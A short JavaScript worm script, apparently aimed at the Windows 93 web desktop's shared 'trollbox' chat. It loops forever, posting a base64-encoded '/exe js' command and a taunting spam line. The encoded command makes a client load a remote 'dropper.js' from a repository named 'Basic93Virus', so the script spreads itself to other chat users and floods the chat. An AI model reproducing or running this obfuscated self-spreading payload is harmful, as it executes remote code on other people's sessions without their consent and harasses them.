function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function input_text(inp_value) {
	document.getElementsByTagName('iframe')[0].contentWindow.document.getElementById('trollbox_input').value=inp_value
}

function submit_text() {
	document.getElementsByTagName('iframe')[0].contentWindow.document.getElementsByTagName('button')[1].click()
}

function send_text(msg) {
	input_text(msg)
	submit_text()
}

async function lets_do_this() {
	console.log('clippy')
	$exe('trollbox')
	$exe('terminal','tree','hello','glitch')
	await sleep(500)
	while (true) {
	send_text('/exe js data:application/javascript;base64,JGxvYWRlcihbJ2h0dHBzOi8vZ2hjZG4ucmF3Z2l0Lm9yZy9PdXRSaXRlL0Jhc2ljOTNWaXJ1cy9tYWluL2Ryb3BwZXIuanMnXSwgJG5vb3ApOw=')
	await sleep(100)
	send_text('I AM A REDDITOR LOL')
	await sleep(100)
}	
}

lets_do_this()

$exe('reboot') // something went wrong, lets just reboot LOL
